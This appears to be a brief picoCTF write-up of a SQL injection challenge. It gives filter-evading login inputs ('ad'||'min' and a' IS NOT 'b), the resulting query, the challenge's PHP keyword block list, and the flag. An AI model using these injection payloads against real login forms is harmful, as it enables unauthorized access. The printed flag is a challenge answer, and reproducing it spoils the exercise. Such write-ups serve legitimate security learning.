


Username and password for sqli
```
username: ad'||'min
password: a' IS NOT 'b
```

The response
```
SELECT username, password FROM users WHERE username='ad'||'min' AND password='a' IS NOT 'b'
```

the php site where i found the flag

```
<?php  
session_start();  
  
if (!isset($_SESSION["winner2"])) {    $_SESSION["winner2"] = 0;  
}  
$win = $_SESSION["winner2"];  
$view = ($_SERVER["PHP_SELF"] == "/filter.php");  
  
if ($win === 0) {    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");  
    if ($view) {  
        echo "Filters: ".implode(" ", $filter)."<br/>";  
    }  
} else if ($win === 1) {  
    if ($view) {        highlight_file("filter.php");  
    }    $_SESSION["winner2"] = 0;        // <- Don't refresh!  
} else {    $_SESSION["winner2"] = 0;  
}  
  
// picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}  
?>
```

the flag
```
picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585} 
```

